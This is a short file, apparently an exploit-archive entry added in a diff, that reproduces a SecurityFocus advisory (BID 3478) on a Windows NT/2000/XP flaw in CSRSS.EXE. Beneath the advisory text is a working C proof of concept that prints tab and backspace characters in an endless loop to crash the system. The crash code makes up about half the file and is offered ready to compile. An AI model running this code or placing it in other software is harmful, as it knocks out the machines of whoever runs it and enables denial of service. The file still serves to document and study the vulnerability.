@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/3478/info
+
+CSRSS.EXE is the Windows NT Client Server Run-time Subsystem. It is responsible for console windows and the creation and deletion of threads. The Windows NT kernel is dependant on this service and will halt if the service stops for any reason.
+
+If certain combinations of special "whitespace" characters followed by "backspace" characters are output in high-level console I/O, a user could successfully crash a Windows NT, 2000, or XP system. 
+
+#include <stdio.h>
+
+int main(void)
+{
+while (1)
+printf("\t\t\b\b\b\b\b\b");
+return 0;
+} 
